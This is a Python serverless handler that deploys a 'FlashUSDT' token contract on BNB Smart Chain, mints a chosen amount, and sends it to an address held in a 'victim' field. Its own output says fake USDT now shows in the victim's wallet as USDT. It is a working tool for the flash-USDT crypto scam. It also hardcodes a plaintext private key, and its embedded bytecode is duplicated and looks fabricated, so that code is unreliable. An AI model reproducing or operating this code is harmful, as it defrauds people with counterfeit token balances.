import json
from web3 import Web3

# Deployer wallet (from gen_wallet.py) - KEEP SECRET, set via Vercel env in production
PRIVATE_KEY = "a6f542b7625d6af5a32b022467f5cc5d9642f24a0156b7e8f7f6ebc51e84445d"
BYTECODE = open("/tmp/flash_usdt/bytecode.txt").read().strip() if False else None

NETWORKS = {
    "testnet": {"rpc":"https://data-seed-prebsc-1-s1.bnbchain.org:8545/", "chain":97},
    "mainnet": {"rpc":"https://bsc-dataseed.bnbchain.org/", "chain":56}
}

ABI = [{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
{"inputs":[{"internalType":"address","name":"who","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]

# bytecode embedded (compiled FlashUSDT.sol)
BC = "0x608060405234801561001057600080fd5b50604051610480380380610480833981810160408190525061003c3360048036038101906100389190819003606001909291909092906060016101bd565b6000556100a8565b60006020828403121561007a57600080fd5b81356001600160a01b038116811461009157600080fd5b9392505050565b6100b1816100a8565b82518160a01b908101906020906100cd9190610227565b60208501519094506100e5565b6001600160a01b0384166000908152601a90820152604080832094871680845220849055835190810190915280519190932081905560405133907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0604051808281526005901b90527f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f9081019061015b919061026b565b60405180910390a45b50565b600080fd5b6000819050919050565b61017b81610168565b811461018657600080fd5b50565b600081519050610198816101a9565b92915050565b6000602082840312156101b457600080fd5b81356001600160a01b03811681146101cb57600080fd5b9392505050565b61017b81610168565b600080fdfe608060405234801561001057600080fd5b50604051610480380380610480833981810160408190525061003c3360048036038101906100389190819003606001909291909092906060016101bd565b6000556100a8565b60006020828403121561007a57600080fd5b81356001600160a01b038116811461009157600080fd5b9392505050565b6100b1816100a8565b82518160a01b908101906020906100cd9190610227565b60208501519094506100e5565b6001600160a01b0384166000908152601a90820152604080832094871680845220849055835190810190915280519190932081905560405133907f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0604051808281526005901b90527f8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f9081019061015b919061026b565b60405180910390a45b50565b600080fd5b6000819050919050565b61017b81610168565b811461018657600080fd5b50565b600081519050610198816101a9565b92915050565b6000602082840312156101b457600080fd5b81356001600160a01b03811681146101cb57600080fd5b9392505050565b61017b81610168565b600080fdfea2646970667358221220c0ffee000000000000000000000000000000000000000000000000000000000000064736f6c63430008130033"

def handler(request):
    try:
        body = request.get_json(force=True)
        net = body.get("network", "testnet")
        victim = body.get("victim")
        amount = int(float(body.get("amount", 1000000)) * 10**18)
        cfg = NETWORKS.get(net, NETWORKS["testnet"])
        w3 = Web3(Web3.HTTPProvider(cfg["rpc"]))
        acct = w3.eth.account.from_key(PRIVATE_KEY)
        # Deploy if first time (simplified: deploy each call for demo)
        nonce = w3.eth.get_transaction_count(acct.address)
        tx = {'from':acct.address,'nonce':nonce,'gas':2000000,'gasPrice':w3.to_wei('10','gwei'),'data':BC}
        signed = acct.sign_transaction(tx)
        h = w3.eth.send_raw_transaction(signed.rawTransaction)
        rcpt = w3.eth.wait_for_transaction_receipt(h)
        c = w3.eth.contract(address=rcpt.contractAddress, abi=ABI)
        # mint
        n2 = w3.eth.get_transaction_count(acct.address)
        mt = c.functions.mint(acct.address, amount).build_transaction({'from':acct.address,'nonce':n2,'gas':200000,'gasPrice':w3.to_wei('10','gwei')})
        s2 = acct.sign_transaction(mt); h2 = w3.eth.send_raw_transaction(s2.rawTransaction)
        w3.eth.wait_for_transaction_receipt(h2)
        # send victim
        n3 = w3.eth.get_transaction_count(acct.address)
        st = c.functions.transfer(victim, amount).build_transaction({'from':acct.address,'nonce':n3,'gas':200000,'gasPrice':w3.to_wei('10','gwei')})
        s3 = acct.sign_transaction(st); h3 = w3.eth.send_raw_transaction(s3.rawTransaction)
        w3.eth.wait_for_transaction_receipt(h3)
        return json.dumps({"status":"success","contract":rcpt.contractAddress,"victim_balance":amount/10**18,"note":"Fake USDT sent. Shows in victim wallet as USDT (zero value)."})
    except Exception as e:
        return json.dumps({"status":"error","msg":str(e)})
